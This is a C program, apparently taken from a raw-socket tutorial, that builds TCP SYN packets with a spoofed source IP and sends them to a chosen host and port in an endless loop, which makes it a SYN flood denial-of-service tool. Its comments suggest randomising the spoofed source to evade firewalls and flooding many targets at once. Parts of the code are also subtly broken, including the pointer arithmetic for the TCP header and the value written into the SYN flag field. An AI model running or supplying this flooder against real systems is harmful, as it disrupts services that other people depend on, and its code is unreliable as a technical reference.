#include <unistd.h>

#include <stdio.h>

#include <sys/socket.h>

#include <netinet/ip.h>

#include <netinet/tcp.h>

 

/* TCP flags, can define something like this if needed */

/*

#define URG 32

#define ACK 16

#define PSH 8

#define RST 4

#define SYN 2

#define FIN 1

*/

 

struct ipheader {

 unsigned char      iph_ihl:5, /* Little-endian */

                    iph_ver:4;

 unsigned char      iph_tos;

 unsigned short int iph_len;

 unsigned short int iph_ident;

 unsigned char      iph_flags;

 unsigned short int iph_offset;

 unsigned char      iph_ttl;

 unsigned char      iph_protocol;

 unsigned short int iph_chksum;

 unsigned int       iph_sourceip;

 unsigned int       iph_destip;

};

/* Structure of the TCP header */

struct tcpheader {

 unsigned short int   tcph_srcport;

 unsigned short int   tcph_destport;

 unsigned int             tcph_seqnum;

 unsigned int             tcph_acknum;

 unsigned char          tcph_reserved:4, tcph_offset:4;

 unsigned int

       tcp_res1:4,      /*little-endian*/

       tcph_hlen:4,     /*length of tcp header in 32-bit words*/

       tcph_fin:1,      /*Finish flag "fin"*/

       tcph_syn:1,       /*Synchronize sequence numbers to start a connection*/

       tcph_rst:1,      /*Reset flag */

       tcph_psh:1,      /*Push, sends data to the application*/

       tcph_ack:1,      /*acknowledge*/

       tcph_urg:1,      /*urgent pointer*/

       tcph_res2:2;

 unsigned short int   tcph_win;

 unsigned short int   tcph_chksum;

 unsigned short int   tcph_urgptr;

};

 

/* function for header checksums */

unsigned short csum (unsigned short *buf, int nwords)

{

  unsigned long sum;

  for (sum = 0; nwords > 0; nwords--)

    sum += *buf++;

  sum = (sum >> 16) + (sum & 0xffff);

  sum += (sum >> 16);

  return (unsigned short)(~sum);

}

 

int main(int argc, char *argv[ ])

{

  /* open raw socket */

int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);

  /* this buffer will contain ip header, tcp header, and payload we'll

    point an ip header structure at its beginning, and a tcp header


    structure after that to write the header values into it */

char datagram[4096];

struct ipheader *iph = (struct ipheader *) datagram;

  struct tcpheader *tcph = (struct tcpheader *) datagram + sizeof (struct ipheader);

  struct sockaddr_in sin;

 

  if(argc != 3)

  {

       printf("Invalid parameters!\n");

       printf("Usage: %s <target IP/hostname> <port to be flooded>\n", argv[0]);

       exit(-1);

  }

 

  unsigned int floodport = atoi(argv[2]);

/* the sockaddr_in structure containing the destination

 address is used in sendto() to determine the datagrams path */

sin.sin_family = AF_INET;

/* you byte-order >1byte header values to network byte

 order (not needed on big-endian machines). */

sin.sin_port = htons(floodport);

sin.sin_addr.s_addr = inet_addr(argv[1]);

   /* zero out the buffer */

   memset(datagram, 0, 4096);

   /* we'll now fill in the ip/tcp header values */

   iph->iph_ihl = 5;

   iph->iph_ver = 4;

iph->iph_tos = 0;

/* just datagram, no payload. You can add payload as needed */

iph->iph_len = sizeof (struct ipheader) + sizeof (struct tcpheader);

/* the value doesn't matter here */

  iph->iph_ident = htonl (54321);

  iph->iph_offset = 0;

  iph->iph_ttl = 255;

iph->iph_protocol = 6;  // upper layer protocol, TCP

  /* set it to 0 before computing the actual checksum later */

iph->iph_chksum = 0;


/* SYN's can be blindly spoofed.  Better to create randomly

  generated IP to avoid blocking by firewall */

iph->iph_sourceip = inet_addr ("192.168.3.100");

/* Better if we can create a range of destination IP,

  so we can flood all of them at the same time */

iph->iph_destip = sin.sin_addr.s_addr;

/* arbitrary port for source */

  tcph->tcph_srcport = htons (5678);

tcph->tcph_destport = htons (floodport);

/* in a SYN packet, the sequence is a random */

tcph->tcph_seqnum = random();

/* number, and the ACK sequence is 0 in the 1st packet */

  tcph->tcph_acknum = 0;

  tcph->tcph_res2 = 0;

  /* first and only tcp segment */

tcph->tcph_offset = 0;

/* initial connection request, I failed to use TH_FIN,

  so check the tcp.h, TH_FIN = 0x02 or use #define TH_FIN 0x02*/

tcph->tcph_syn = 0x02;

/* maximum allowed window size */

tcph->tcph_win = htonl (65535);

  /* if you set a checksum to zero, your kernel's IP stack should

    fill in the correct checksum during transmission. */

  tcph->tcph_chksum = 0;

  tcph-> tcph_urgptr = 0;

 

  iph-> iph_chksum = csum ((unsigned short *) datagram, iph-> iph_len >> 1);

 

/* a IP_HDRINCL call, to make sure that the kernel knows

  the header is included in the data, and doesn't insert

  its own header into the packet before our data */

/* Some dummy */

int tmp = 1;

const int *val = &tmp;

if(setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0)

{

printf("Error: setsockopt() - Cannot set HDRINCL!\n");

/* If something wrong, just exit */

exit(-1);

}

else

  printf("OK, using your own header!\n");

 

/* You have to manually stop this program */

while(1)

{

  if(sendto(s,                      /* our socket */

           datagram,                /* the buffer containing headers and data */

           iph->iph_len,            /* total length of our datagram */

           0,                       /* routing flags, normally always 0 */

           (struct sockaddr *) &sin, /* socket addr, just like in */

           sizeof (sin)) < 0)        /* a normal send() */

     printf("sendto() error!!!.\n");

  else

    printf("Flooding %s at %u...\n", argv[1], floodport);

 

}

  return 0;

}